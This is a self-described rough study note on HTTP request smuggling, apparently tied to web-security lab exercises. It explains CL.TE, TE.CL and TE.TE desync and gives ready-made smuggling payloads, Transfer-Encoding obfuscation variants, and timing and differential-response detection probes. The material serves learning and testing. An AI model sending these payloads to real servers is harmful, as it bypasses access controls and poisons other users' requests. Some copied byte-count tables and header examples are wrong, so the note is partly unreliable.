---
created: 2026-06-05
status: slop
---

1.1 HTTP Protocol Fundamentals
- HTTP/1.0 vs HTTP/1.1 vs HTTP/2 architecture and parsing differences
- HTTP request/response structure (methods, headers, bodies, transfer)
- Persistent connections and keep-alive mechanisms
- Chunked transfer encoding and Content-Length rules
- HTTP pipelining, connection reuse, and multiplexing distinctions
- URL encoding and decoding, CRLF injection basics

1.2 Reverse Proxies, Load Balancers, and Application Servers
- Common proxy architectures (reverse proxy, forward proxy)
- Intermediary devices: Nginx, HAProxy, Apache, Squid, AWS ELB, Cloudflare
- Connection coalescing, socket pooling, and buffering differences
- Handling of request splitting/aggregation across proxies and back-ends

1.3 HTTP Parsing Behaviors
- RFC ambiguities, especially around illegal/ambiguous requests
- Differences in parsing Content-Length and Transfer-Encoding headers
- Non-standard headers (e.g., `X-Original-URL`, `X-Forwarded-For`)
- Header folding, whitespace tolerances, control characters

## Protocol foundations

### HTTP/1.0: One connection per request

- Early HTTP, **HTTP/1.0**, required **one TCP connection per each request-response pair**. 
- The client opens a connection, sends a single request, receives a response, and the connection is torn down.
- This means a full TCP handshake and teardown for every single resource the client requests, including images, stylesheets, and scripts.
- This is extremely inefficient; each handshake adds latency.

---
- To work around this, developers started introducing an unofficial *keep-alive mechanism* — an informal agreement between a client and server to hold the TCP socket open across multiple exchanges. 
- The client includes the [`Connnection: keep-alive`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Connection) header in requests:

```http
Connection: Keep-Alive
```

- If the server supports it, it echoes the header in response and keeps the connection alive. 
- Either side can close the connection by sending `Connection: close` header. 

```http
Connection: close
```

- This mechanism was never standardized in HTTP/1.0; behavior varied wildly across implementations — different timeout and maximum requests-per-connection values, inconsistent error handling. It worked, but unreliably.

### HTTP/1.1: Persistence by default

- The HTTP/1.1 standard, [`RFC 7230`](https://datatracker.ietf.org/doc/html/rfc7230), made connection persistence the protocol default.
- After each response, the socket stays open unless one party sends `Connection: close` to signal it wants to terminate. 

```http
Connection: close
```

#### Pipelining 

- HTTP/1.1 also introduced **HTTP pipelining**: a mechanism that allows a client to dispatch *multiple requests back-to-back **without waiting for each preceding response***.
- This eliminates the idle round-trip between sequential requests. 
- However, responses must be delivered **in the exact order** requests were received. 
- This means one slow back-end handler **blocks all queued responses** — a condition known as **head-of-line (HOL) blocking**.
- This is why browser vendors eventually disabled pipelining by default. 

>[!note] HTTP/2 eliminates HOL blocking through **binary stream multiplexing**: frames from different streams are interleaved on a single connection without ordering constraints. This is one of the primary motivations behind the HTTP/2 design.


### Message boundary mechanisms

- TCP is a byte-stream protocol. It carries no inherent notion of where one application-level message ends and the next begins. 
- In a persistent connection — where multiple requests flow over a single socket — something must delimit individual messages unambiguously.
- HTTP/1.1 provides twp mechanisms to delimit messages:
	- `Content-Length`
	- `Transfer-Encoding: chunked`

>[!note] Discrepancies in implementation of these two mechanisms — `Content-Length` and `Transfer-Encoding: chunked` — including which one takes priority when both are present, is the root cause of **HTTP request smuggling vulnerabilities**.
#### `Content-Length`

>The **[`Content-Length`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Length)** HTTP header specifies the anticipated size of the message **body** in **decimal octets** (bytes, written as a decimal number). 

```http
Content-Length: <length>
```

- The value counts bytes in the body only — not the headers and not the blank [CRLF](https://developer.mozilla.org/en-US/docs/Glossary/CRLF) line that separates headers from body.

```HTTP
POST /path/query HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10
␍␊                 ← doesn't count
q=anything          ← counts
```

>[!note] ␍␊ here denotes a CRLF (Carriage Return, Line Feed), `\r\n`.

- If content encoding is applied (e.g., `gzip`), `Content-Length` reflects the size **after encoding** (e.g., compressed size), not the original.

>[!note] See [`Content-Length header — mdn web docs`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Length).
#### **`Transfer-Encoding: chunked`**

>The **[`Transfer-Encoding`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Transfer-Encoding)** HTTP header specifies the encoding used to transfer message between nodes on the network. 

>[!interesting]- Common `Transfer-Encoding` values 
> - `chunked` — The message body is sent is a *series of chunks*. The `Content-Length` header must be omitted.
> - `deflate` — The message body is compressed using the **deflate** compression algorithm.
> - `gzip` — The message body is compressed using the **Lempel-Ziv coding (LZ77)** algorithm, with a 32-bit CRC.
> - `compress` — The message body is compressed using the **Lempel-Ziv-Welch (LZW)** algorithm; rarely used.

>[!note] See [`Transfer-Encoding — mdn web docs`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Transfer-Encoding).
Let's take a closer look at `Transfer-Encoding: chunked`. This value is often used for streaming or when body size is unknown upfront.

- **`Transfer-Encoding: chunked`** specifies that the message body is transmitted as a sequence of independently framed chunks, each prefixed by its size in hexadecimal. The sequence is terminated by a zero-length chunk.

```HTTP
Transfer-Encoding: chunked
```

>[!note] `chunked` encoding is used when the total payload length is unknown at the start of transmission, such as for content streaming.

```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Transfer-Encoding: chunked
␍␊         ← not a part of the message body

B␍␊
first chunk␍␊
␍␊
C␍␊
second chunk␍␊
␍␊
0␍␊
␍␊
```

- Each chunk structure:
	- **Size + `\r\n`** — Chunk size in **hexadecimal octets** — the number of bytes in the chunk, specified as a hexadecimal number.
	- **Chunk data + `\r\n`** — The chunk payload.
	- **CLRF `\r\n`** — Marks the end of chunk data (not included in the chunk size).

```HTTP
B␍␊           ← chunk size: eleven bytes
first chunk␍␊
␍␊
```

- Last chunk that marks of the sequence:
	- **Chunk size `0` + `\r\n`** — Zero-size chunk, signifies there are no more octets in the sequence. 
	- **(Optional) trailer headers** — [HTTP trailer headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Trailer), may be empty.
	- **CRLF `\r\n`** — End of chunk with zero data octets.

```HTTP
0␍␊
␍␊
```

>[!important] `RFC 7230` specifies that if `Transfer-Encoding` is present and specifies `chunked`, the receiver **must** ignore any `Content-Length` header in the same message. The specification is unambiguous. The problem is, real-world implementations often deviate from it.

### Intermediaries and connection coalescing

- Production deployments rarely route client traffic directly to an application server. 
- Inbound requests almost always traverse one or more intermediary servers before reaching the back-end: reverse proxies, load balancers, CDN edge nodes, or WAFs.

>A **reverse proxy** is a server that receives inbound connections from clients and forwards them to one or more upstream application servers. Reverse proxies are often configured to handle TLS termination, load-balancing, and caching; they also often act as **WAFs** (Web Application Firewalls), inspecting traffic and filtering malicious requests. 

>A **forward proxy** is a server that acts on behalf of clients rather than servers; it forwards outbound client requests toward external origins. 

- Common software deployed as reverse proxies: 
	- Nginx
	- HAProxy
	- Apache HTTP Server (with `mod_proxy`)
	- AWS Elastic Load Balancing
	- Cloudflare edge nodes
	- Squid (in reverse proxy mode)
	- Etc.

#### Connection coalescing 

- For a reverse proxy, opening a new TCP connection for each forwarded request would nullify latency benefits introduced by persistent connections maintained with the clients. 
- Instead, reverse proxies maintain pools of persistent TCP connections to back-end servers; they are kept open so that incoming client requests can be multiplexed through them.


![[connection_coalescing.svg]]

>**Connection coalescing** is the practice of routing multiple incoming client requests through a single maintained TCP connection to an upstream server. This eliminates per-request TCP handshake overhead between the proxy and the back-end.

- From a the back-end's perspective, any single socket carries a stream of HTTP requests from potentially many different clients. 
- There is no mechanism for the back-end to attribute individual bytes to individual requests and clients except relying on message boundaries inferred from the request headers.

This is what makes HTTP request smuggling possible. If the front-end and back-end servers parse request boundaries differently, one client's request can blend with another and influence the response. 

> [!note] Some proxies buffer the complete client request body before forwarding. Others stream bytes to the back-end as they arrive. Buffering behavior affects how timing-based detection probes behave.

#### What proxies do to request

- Beyond simply forwarding bytes, intermediary servers can meaningfully transform requests before passing them upstream. Common transformations include:

	- **Header injection**
		- Adding `X-Forwarded-For`, `X-Real-IP`, `X-Forwarded-Proto`, and similar headers.
	- **Header normalization**
		- Some proxies enforce a canonical header format, such as by lowercasing header names, collapsing duplicate whitespace, or stripping unknown or non-standard headers. 
		- Obfuscation-based TE.TE attacks often fail against proxies that normalize aggressively — the malformed `Transfer-Encoding` variant gets cleaned before it reaches the back-end.
	- **Chunked decoding and re-encoding**
		- Certain proxies decode a chunked request body, buffer the decoded content, and re-send it to the back-end as a non-chunked request with a fresh `Content-Length`. 
		- If this occurs, TE.CL and CL.TE attacks are typically neutralized at that hop.
	- **Security filtering**
		- WAFs positioned as front-end proxies may strip, reject, or modify requests containing suspicious payloads — including requests with both `Content-Length` and `Transfer-Encoding`. 
		- This is partly why TE.TE obfuscation exists: to get a mutated header past a filtering layer that would otherwise block the dual-header pattern.
## HTTP request smuggling

>**HTTP Request Smuggling (HRS)**, also known as **HTTP desync attack**, is an attack that exploits **inconsistencies in how front-end (e.g., load balancers, reverse proxies) and back-end servers interpret HTTP request boundaries**. 

- Typically, HRS attacks manipulate the way the front-end and back-end servers interpret requests with both `Content-Length` and `Transfer-Encoding` headers present.

>[!important] The attack doesn't require either server to be "wrong" in isolation. It only requires them to disagree. A standards-compliant front-end paired with a non-compliant back-end, or vice versa, is sufficient.

### RFC ambiguities that enable desync

- [`RFC 7230`](https://datatracker.ietf.org/doc/html/rfc7230) defines `Transfer-Encoding` priority clearly, but real-world implementations may diverge from the specification in several ways:
	- Some front-end servers do not support `Transfer-Encoding` in requests and silently fall back to `Content-Length`.
	- Some servers apply their own priority ordering regardless of the RFC.
	- Whitespaces around header names and values may be handled differently.
	- Non-ASCII bytes in header values, such as null bytes and tab characters, may be parsed differently.
	- Header folding (multi-line header values) is formally deprecated in `RFC 7230 `but still accepted by some parsers.

## Attack types

- HRS variants are named using the notation `X.Y`, where `X` identifies what the front-end uses to parse request boundaries, and `Y` identifies what the back-end uses:
	- **CL.TE (`Content-Length.Transfer-Encoding`)**
	- **TE.CL (`Transfer-Encoding.Content-Length`)**
	- **TE.TE (`Transfer-Encoding.Transfer-Encoding`)**

>[!note] Your goal is to make the front-end interpret your request as one, and the back-end — as two.

| Type    | What is smuggled                                                          |
| ------- | ------------------------------------------------------------------------- |
| `CL.TE` | The data between the zero chunk and the point `Content-Length` points to. |
| `TE.CL` | The data inside the chunk.                                                |
| `TE.TE` |                                                                           |


### CL.TE (`Content-Length.Transfer-Encoding`)

- The **front-end** server does not support or silently ignores the `Transfers-Encoding: chunked` header. It relies entirely on the `Content-Length` header to determine where the request body ends.
- The **back-end** server correctly implements chunked encoding. It prioritizes `Transfer-Encoding` when both headers are present. 

---
You craft a single request containing both `Content-Length` and `Transfer-Encoding: chunked` headers. 

```http
POST / HTTP/1.1
Host: example.com
Content-Length: 13
Transfer-Encoding: chunked

0␍␊
␍␊
SMUGGLED
```

- The **front-end** (`CL`) measures the body using `Content-Length` and forwards all declared bytes to the back-end (everything including `SMUGGLED`).
- The **back-end** (`TE`) favors `Transfer-Encoded: chunked` and processes the body as a series of chunks. It sees a `0␍␊` chunk (which signals the end of the request) and considers the current request complete.
- The remaining bytes after the zero chunk — bytes that the front-end included because they fall within the `Content-Length` boundary (`SMUGGLED`) — remain in the connection buffer. These bytes are interpreted as a the **prefix of the next request** arriving on the same connection.

![[CL.TE.svg]]


>[!tip]+ How to calculate `Content-Length` (from scratch)
> 
> 
> - `Content-Length` counts **only the bytes in the body**, starting **after** the blank line that separates headers from the body; the 2-byte blank line, CRLF, is **not** covered by the `Content-Length`).
> - Every line ends with `␍␊` (CRLF = `2` bytes). These CRLFs inside the body are included in the `Content-Length`.
> 
> | Segment    | Bytes |
> | ---------- | ----- |
> | `0␍␊`      | `3`   |
> | `␍␊`       | `2`   |
> | `SMUGGLED` | `8`   |
> | Total      | `13`  |
> 

- The front-end reads exactly the number of bytes specified by `Content-Length` and forwards them.
- The back-end sees the `0` chunk, ends the current request, and treats everything after it as the beginning of the next request.

#### Bypassing front-end access controls

- Send the following request **twice** in Burp Repeater:
	
```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Foo: x
```

![[CL.TE_bypassing_access_controls.svg]]

>[!interesting]+ How this works
> 
> - The body the front-end sees (governed by `Content-Length: 49`) starts right after the headers’ blank line:
> 
> ```http
> 0␍␊
> ␍␊
> GET /admin HTTP/1.1␍␊
> Host: localhost␍␊
> Foo: x
> ```
> 
> - The total `Content-Length` is `49`:
> 	- `0␍␊` -> `3` bytes.
> 	- `␍␊` (the empty line after the `0` chunk) -> `2` bytes.
> 	- `GET /admin HTTP/1.1␍␊` -> `21` bytes (`19` printable characters + `2` CRLF bytes).
> 	- `Host: localhost␍␊` -> `17` bytes (`15` characters + `2` CRLF bytes).
> 	- `Foo: x` (no CRLF) -> `6` bytes.
> 
>>[!important] The final header line (`Foo: x`) is intentionally missing a trailing CRLF.
> 
> - Why sent twice? 
> 	- **First send**: The smuggled request is left in the back-end’s connection buffer, poisoning the stream.
> 	- **Second request** (usually a normal `GET /`  or `POST /`): The back-end processes the leftover bytes from the first request as the current request.

>[!tip]+
> - To calculate length automatically, paste the entire body into a hex editor, Burp’s Inspector (Hex tab), or run this tiny Python snippet:
> 
> ```python
> body = """0
> 
> GET /admin HTTP/1.1
> Host: example.com
> Foo: x
> """
> print(len(body.encode('ascii')))
> ```

- Notice that in the above request, the `Host` header appears **two times**. If the application validates this, you will get an error (e.g., `Duplicate header names are not allowed`). To deal with that, you can **make the headers of the next request, including `Host`, to be treated as part of the request body**:

```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

>[!note]+ How this works
> - The smuggled request’s own Content-Length: 10 is deliberately larger than the actual body (`x=`). This makes the smuggled request consume part of the _following_ legitimate request and stabilize the exploit.
###  TE.CL (`Transfer-Encoding.Content-Length`)

- The **front-end** server correctly implements `Transfer-Encoding: chunked` and terminates the request when it sees the zero chunk.
- The **back-end** server relies on `Content-Length` to determine request length and does not (or only partially) honor `chunked` encoding.

---
You craft a single request containing **both** `Content-Length` and `Transfer-Encoding: chunked` headers.


```http
POST / HTTP/1.1
Host: example.com
Content-Length: 3
Transfer-Encoding: chunked

8␍␊
SMUGGLED␍␊
0␍␊
␍␊
```

- The **front-end** (`TE`) fully parses the chunked body (including all chunk data and the terminating `0` chunk) and forwards the entire raw byte sequence to the back-end.
- The **back-end** (`CL`) reads only the small number of bytes specified by `Content-Length`, then considers the request complete. 
- Everything after the `Content-Length` boundary remains in the connection buffer. These bytes are interpreted as the **prefix of the next request**.


![[TE.CL.svg]]

- The front-end (`TE`) processes body as **chunks**.
	- The first chunk: `8` (hex) = `8` decimal bytes of data: `SMUGGLED␍␊`.
	- Then terminating chunk `0␍␊`.
	- The front-end forwards this entire request as chunked to the backend. 
- The back-end (`CL`) uses `Content-Length`
	- It only reads the first `3` bytes of the body (`8␍␊`).
	- Stops there. The rest of the body (`SMUGGLED...`) is left on the socket. 
	- When the nest real request arrives on the same connection, the back-end treats those leftover bytes as the **beginning** of that next request.

>[!note] In TE.CL HRS, you need to include the trailing sequence `␍␊` following the final `0`.

- `Content-Length: 3` is the byte length of `8␍␊` (the chunk-size line is one ASCII digit + CRLF). The back-end reads 3 bytes and considers the body done.
- `SMUGGLED␍␊0␍␊␍␊` remains in the buffer as the next request's prefix. 

| Segment    | Bytes |
| ---------- | ----- |
| `8␍␊`      | `3`   |
| `␍␊`       | `2`   |
| `SMUGGLED` | `8`   |
| Total      | `13`  |

>[!example]+ 
The following request exploits TL.CE HRS to bypass front-end security controls and access admin panel:
> ```HTTP
> POST / HTTP/1.1
> Host: example.com
> Content-Length: 3
> Transfer-Encoding: chunked
> 
> 25
> GET /admin HTTP/1.1
> Host: example.com
> 0
> ```

>[!important] When calculating the size of a chunk in `Transfer-Encoding: chunked`, **the CRLF bytes surrounding the chunk data are NOT included** in the chunk size value itself.

>[!tip]- How to construct?
> 1. Choose the request you want to smuggle:
> 
> ```HTTP
> GET /admin HTTP/1.1
> Host: example.com
> ```
> 
> 2. Choose the endpoint where you can send `POST` requests, such as `/`:
> 
> ```HTTP
> POST / HTTP/1.1
> Host: example.com
> Content-Length: 3
> Transfer-Encoding: chunked
> 
> BODY
> 
> ```
>
> 3. Insert the request being smuggled as a content of a chunk:
> 
> ```HTTP
> POST / HTTP/1.1
> Host: example.com
> Content-Length: 3
> Transfer-Encoding: chunked
> 
> XX
> GET /admin HTTP/1.1
> Host: example.com
> 0
> ```
> 
> 4. Calculate the length of the chunk (in hexadecimal) and insert this number before the chunk:
> 
> ```HTTP
> POST / HTTP/1.1
> Host: example.com
> Content-Length: 3
> Transfer-Encoding: chunked
> 
> 25
> GET /admin HTTP/1.1
> Host: example.com
> 0
> ```
> 
> Make sure all necessary CRLF (Carriage Return, Line Feed) characters are set.
> 

#### Payloads and exploitation

##### Bypassing front-end access controls


- Send the following request twice:

```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked

71
POST /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```
- **Outer `Content-Length: 4`** 
	- This is the value the back-end uses. It tells the back-end to only read the first 4 bytes of the body. 
	- Commonly set to `3`, `4`, or `5` — you want it to consume just the start of the first chunk line (e.g., `60␍␊` or `87␍␊`).
- **The big chunk size** (in hex)
	1. Write the **full smuggled request** you want the back-end to process (including all its headers and the blank line).
	2. Count the **exact byte length** of everything from the start of that smuggled request **up to and including** the last byte before the final `0`.
	3. Convert that decimal number to **hexadecimal** → that becomes your chunk size.

	```http
	POST /admin HTTP/1.1␍␊
	Host: localhost␍␊
	Content-Type: application/x-www-form-urlencoded␍␊
	Content-Length: 15␍␊
	␍␊
	x=1
	```
	
	- The full size of the smuggled request is `113` in decimal:
		- `POST /admin HTTP/1.1␍␊` -> `22` bytes. 
		- `Host: localhost␍␊` -> `17` bytes.
		- `Content-Type: application/x-www-form-urlencoded␍␊` -> `49` bytes.
		- `Content-Length: 15␍␊` -> `20` bytes.
		- `␍␊` -> `2` bytes.
		- `x=1` -> `3` bytes.
	- Convert to hex: `113` -> `71`.
- **`Content-Length: 15 + x=1` in the smuggled request**
	- Setting a slightly larger `Content-Length` than the actual body (`x=1` is `3` bytes) helps 'eat' part of the next real request, stabilizing the attack and preventing the connection from breaking immediately.


```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-length: 4
Transfer-Encoding: chunked

87
GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0
```
### TE.TE (`Transfer-Encoding.Transfer-Encoding`)

- Both front-end and back-end servers *nominally* prefer `Transfer-Encoding: chunked` to parse request bodies. Neither should use `Content-Length`.
- However, if you submit a malformed or duplicated `Transfer-Encoding` header that one server accepts and the other rejects, the accepting header would use `Transfer-Encoding` header and the rejecting would fall back to `Content-Length`.
- Recreating either a CL.TE or TE.CL condition depending on which server was confused.
---
>[!quote] There are potentially endless ways to obfuscate the `Transfer-Encoding` header.

- Prefix the value with arbitrary characters:

```http
Transfer-Encoding: xchunked
```

- Inject spaces or tabs — between the header name and the colon, or between the colon and the value:

```http
Transfer-Encoding : chunked
```

```http
Transfer-Encoding:	chunked
```

- Inject a leading space or tab before the header name: 

```http
	Transfer-Encoding: chunked
```

>[!note] HTTP/1.1 header folding — a practice of splitting a header field value across multiple lines, where continuation lines begin with at least one space or tab — is defined in [`RFC 2616`](https://datatracker.ietf.org/doc/html/rfc2616) and **deprecated** in [`RFC 7230`](https://datatracker.ietf.org/doc/html/rfc7230) (current standard). Some implementations, however,  may still interpret the leading whitespace as a folded continuation of the previous header, misreading the line.

- Inject non-ASCII bytes, such as a null byte, in the header value:

```http
Transfer-Encoding: chùnked
```
```http
Transfer-Encoding: \x00chunked
```

- Duplicate the `Transfer-Encoding` header with one valid and one invalid values:

```http
Transfer-Encoding: chunked
Transfer-Encoding: x
```

>[!note] Servers that take the last occurrence see `x` (invalid, fall back to CL). Servers that take the first see `chunked`. The disagreement creates a split.

- inject a newline between the header name and the colon:

```http
Transfer-Encoding
: chunked
```

---
```http
Transfer-Encoding: xchunked     # arbitrary symbols before the value

Transfer-Encoding : chunked     # space before the colon

Transfer-Encoding:   chunked    # tab before the value

Transfer-Encoding    : chunked

Transfer-Encoding:xchunked      # invalid value prefix

Transfer-Encoding: chunked      # Transfer-Encoding is duplicated 
Transfer-Encoding: x            # one value is valid, the other isn't

 Transfer-Encoding: chunked     # space injection before the header

	Transfer-Encoding: chunked  # tab before the header

X: X                            # arbitrary invalid header followed by
Transfer-Encoding: chunked      # a valid Transfer-Encoding

Transfer-Encoding               # new line injeciton
: chunked

Transfer-Encoding:              # new line + tab injeciton
	chunked

Transfer-Encoding: chùnked      # replacing characters

Transfer-Encoding: \x00chunked  # NULL byte injection
```

---

```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-length: 4
Transfer-Encoding: chunked
Transfer-encoding: x

5c␍␊
GPOST / HTTP/1.1␍␊
Content-Type: application/x-www-form-urlencoded␍␊
Content-Length: 15␍␊
␍␊
x=1␍␊
0␍␊
␍␊
```

>[!note] In TE.CL HRS, you need to include the trailing sequence `␍␊` following the final `0`.


>[!example]
> ```HTTP
> POST / HTTP/1.1
> Host: example.com
> Content-Length: 4
> Transfer-Encoding: chunked
> Transfer-Encoding: cat
> 
> 5c
> GPOST / HTTP/1.1
> Content-Type: application/x-www-form-urlencoded
> Content-Length: 15
> 
> x=1
> 0
> 
> 
> ```
> 
> - The front-end server receives the request and processes the first `Transfer-Encoding: chunked` header, parsing the message body as chunked data. It forwards what it believes is a complete request.
> - The back-end server, depending on how it handles multiple or malformed `Transfer-Encoding` headers, may ignore the chunked encoding due to the conflicting or malformed header, and instead rely on `Content-Length`. It then may interpret the remaining bytes as a separate HTTP request (starting with `GPOST ...`).

>[!tip] Even minor differences in the implementation or header processing order can trigger the vulnerability.

>[!tip]- How to construct?
> 1. Choose the request you want to smuggle:
> 
> ```HTTP
> GET /admin HTTP/1.1
> Host: example.com
> ```
> 
> 2. Choose the primary endpoint for the front-end where you can send `POST` requests, such as `/`:
> 
> ```HTTP
> POST / HTTP/1.1
> Host: example.com
> Content-Length: 3
> Transfer-Encoding: chunked
> 
> BODY
> 
> ```
> 3. Insert the request being smuggled as a content of a chunk:
> 
> ```HTTP
> POST / HTTP/1.1
> Host: example.com
> Content-Length: 3
> Transfer-Encoding: chunked
> 
> XX
> GET /admin HTTP/1.1
> Host: example.com
> 0
> ```
> 
> 
> 4. Calculate the length of the chunk (in hexadecimal) and insert this number before the chunk:
> 
> ```HTTP
> POST / HTTP/1.1
> Host: example.com
> Content-Length: 3
> Transfer-Encoding: chunked
> 
> 25
> GET /admin HTTP/1.1
> Host: example.com
> 0
> ```
> 
> 
> 5. Insert the second `Transfer-Encoding` header that will be used to confuse one of the servers:
> 
> ```HTTP
> POST / HTTP/1.1
> Host: example.com
> Content-Length: 3
> Transfer-Encoding: chunked
> Transfer-Encoding: cat
> 
> 25
> GET /admin HTTP/1.1
> Host: example.com
> 0
> ```
> 
> 6. Make sure all necessary CRLF (Carriage Return, Line Feed) characters are set (there are typed as characters  `\r\n` explicitly only for illustration):
> 
> ```HTTP
> POST / HTTP/1.1\r\n
> Host: example.com\r\n
> Content-Length: 3\r\n
> Transfer-Encoding: chunked\r\n
> Transfer-Encoding: cat\r\nTransfer-Encoding: cat
> \r\n
> 25\r\n
> GET /admin HTTP/1.1\r\n
> Host: example.com\r\n
> 0\r\n
> \r\n
> ```


## Detection methodology

### Detecting HTTP request smuggling using time delays

- **Time delays** is one of the most effective techniques to detect HTTP request smuggling vulnerabilities. Burp Scanner uses it to automate detection, for example.

>[!tip]+
>The techniques mentioned should be tried on **every single endpoint on the target application** (that's why automation is a good idea). Depending on the endpoint, the request may be forwarded to different back-end servers.

#### Detecting CL.TE using time delays

- If an application is vulnerable to **CL.TE HTTP request smuggling**, then sending a request like the following will often **cause a time delay**:

```http
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 4

1␍␊
A␍␊
X
```

- The front-end uses `Content-Length`, so it forwards only part of this request, omitting the `X`. 
- The back-end server uses `Transfer-Encoding` header, processes the first chunk, and then **waits for the next chunk to arrive** until the timeout. This will cause an observable time delay.

| Infrastructure | Expected outcome                                          |
| -------------- | --------------------------------------------------------- |
| CL.CL          | Immediate response                                        |
| TE.TE          | Front-end rejection (`X` is not a valid chunk size)       |
| TE.CL          | Front-end rejection (`X` after the zero chunk is ignored) |
| **CL.TE**      | **Timeout (~10–30 seconds)**                              |

#### Detecting TE.CL vulnerabilities using time delays

- If an application is vulnerable to **TE.CL HTTP request smuggling**, then sending a request like the following will often **cause a time delay**:

```http
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 6

0␍␊
␍␊
X␍␊
```

- The front-end server uses `Transfer-Endogin`, so it forwards only part of this request, omitting the `X`. 
- The back-end server uses the `Content-Length` header, expects more content in the message body, and **waits for the remaining content to arrive**. This will cause an observable time delay.

>[!note] The timing-based test for TE.CL vulnerabilities will potentially disrupt other application users if the application is vulnerable to the CL.TE variant of the vulnerability. Use it only if the CL.TE test was unsuccessfull.

| Infrastructure | Expected outcome                    |
| -------------- | ----------------------------------- |
| CL.CL          | Immediate response                  |
| TE.TE          | Immediate response                  |
| **TE.CL**      | **Timeout (~10–30 seconds)**        |
| CL.TE          | Potential back-end socket poisoning |

### Confirming HTTP request smuggling using differential responses

- One of the best ways to confirm a vulnerability is to trigger differences in the contents of the application's responses. 
- For this, send two requests to the application in a quick succession:
	- An *attack* request designed to interfere with the processing of the next request.
	- A *normal* request.
- If the response to the normal request contains the expected interference, then the vulnerability is confirmed.

#### Confirming CL.TE vulnerabilities using differential responses

- If an application is vulnerable to **CL.TE HTTP request smuggling**, then sending a request like this followed by a normal request will cause an unexpected response to the second one:

```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e␍␊
q=smuggling&x=␍␊
0␍␊
␍␊
GET /404 HTTP/1.1␍␊
Foo: x
```

```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 11

q=smuggling
```
#### Confirming TE.CL vulnerabilities using differential responses

- If an application is vulnerable to **TE.CL HTTP request smuggling**, then sending a request like this followed by a normal request will cause an unexpected response to the second one:

```http
POST / HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

7c␍␊
GET /404 HTTP/1.1␍␊
Host: example.com␍␊
Content-Type: application/x-www-form-urlencoded␍␊
Content-Length: 128␍␊
␍␊
x=␍␊
0␍␊
␍␊
```

```http
POST / HTTP/1.1␍␊
Host: example.com␍␊
Content-Type: application/x-www-form-urlencoded␍␊
Content-Length: 11␍␊
␍␊
q=smuggling␍␊
␍␊
```

## Detecting and confirming HTTP request smuggling vulnerabilities

One of the best ways to detect HRS vulnerabilities without affecting other users is using **time delays**. To confirm the vulnerability, you can use response-based techniques.
### Time delays



#### CL.TE detection


1. The front-end server uses `Content-Length` to determine request boundaries. It forwards the request to the back-end, but omits the last `X` character.
2. The back-end server uses the `Transfer-Encding` header and ignores `Content-Length`. It reads the first chunk of the length of `1`, and then waits for the next chunk to arrive, which causes an observable delay.

| Infrastructure configuration | Response                                                           |
| ---------------------------- | ------------------------------------------------------------------ |
| CL.CL                        | Back-end response, immediate                                       |
| TE.TE                        | Front-end response, rejected (since `X` is not a valid chunk size) |
| TE.CL                        | Front-end response, rejected (since `X` is not a valid chunk size) |
| **CL.TE**                    | **Timeout**                                                        |

#### TE.CL detection

If the application is vulnerable to TE.CL HRS, the following request will often cause a time delay:

```HTTP
POST / HTTP/1.1
Host: example.com
Transfer-Encoding: chunked
Content-Length: 6

0

X
```

1. The front-end server uses the `Transfer-Encoding` header, reads the zero chunk, and assumes it's the end of the request. It then forwards the request to the back-end, omitting `X`.
2. The back-end server uses the `Content-Length` header. It sees that the request body should be `6` bytes, reads the first few bytes, and waits for the rest to come, which causes an observable delay.

| Infrastructure configuration | Response                     |
| ---------------------------- | ---------------------------- |
| CL.CL                        | Back-end response, immediate |
| TE.TE                        | Back-end response, immediate |
| **TE.CL**                    | **Timeout**                  |
| CL.TE                        | Back-end socket poisoning    |

### Response-based techniques

The core principle is to _smuggle_ part of a crafted HTTP request so that it is processed as a new, separate request by the back-end — without the front-end's awareness.

1. Send a crafted *attack* request designed to interfere with how subsequent requests are processed by the back-end.
2. Immediately send a normal request 
3. Observe the response: if the normal request’s response is altered (error status, missing content, extra headers, or containing content from the attack), this confirms the vulnerability.

Response-based techniques essentially simulate the attack, at the same time trying to minimize potential inconvenience to other users.

#### CL.TE

- **Front-end (proxy, load balancer)**: uses `Content-Length` to determine the request body boundary.    
- **Back-end (application server)**: uses `Transfer-Encoding: chunked`.

To confirm the CL.TE HRS, send the following request twice:

```HTTP
POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

e
q=smuggling&x=
0

GET /404 HTTP/1.1
Foo: x

```

To confirm a CL.TE HRS via response differences, send two requests similar to the following two requests:

1. Attack request

```HTTP
POST /post/comment HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 49
Transfer-Encoding: chunked

0

GET /non-existing-page HTTP/1.1
X-Ignore: X
```

2. Normal request, sent immediately after:

```HTTP
POST /search HTTP/1.1
